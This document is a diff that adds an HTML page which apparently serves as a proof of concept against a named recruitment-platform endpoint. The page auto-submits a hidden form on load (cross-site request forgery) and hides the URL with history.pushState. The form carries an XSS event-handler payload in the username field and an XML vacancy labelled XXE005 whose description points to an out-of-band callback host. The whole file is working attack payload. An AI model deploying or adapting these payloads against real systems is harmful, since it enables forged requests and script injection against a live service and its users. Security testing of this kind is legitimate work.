@@ -1,0 +1,15 @@
+<html>
+
+<body>  
+<form action="https://www.adcourier.com/hybrid.cgi" method="POST">  
+<input type="hidden" name="username" value="random" oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>" />  
+<input type="hidden" name="password" value="random" />  
+<input type="hidden" name="xml" value="<?xml version="1.0" encoding="ISO-8859-1"?> <VacancyPosting> <Method>export</Method> <Vacancy> <DisplayDays>30</DisplayDays> <JobTitle>Security Test</JobTitle> <JobReference>XXE005</JobReference> <Location_Id>123</Location_Id> <JobType>Full-Time</JobType> <Industry>IT</Industry> <SalaryFrom>0</SalaryFrom> <SalaryTo>0</SalaryTo> <SalaryCurrency>GBP</SalaryCurrency> <SalaryPer>hour</SalaryPer> <Skills>testing</Skills> <JobDescription> <![CDATA[ http://x53al0xl2rkptx1k78sm2jeolfr6fxel3.oastify.com ]]> </JobDescription> <Extension name=""/> </Vacancy> </VacancyPosting>" />  
+<input type="submit" value="Submit request" />  
+</form>  
+<script>  
+history.pushState('', '', '/');  
+document.forms[0].submit();  
+</script>  
+</body>  
+</html>
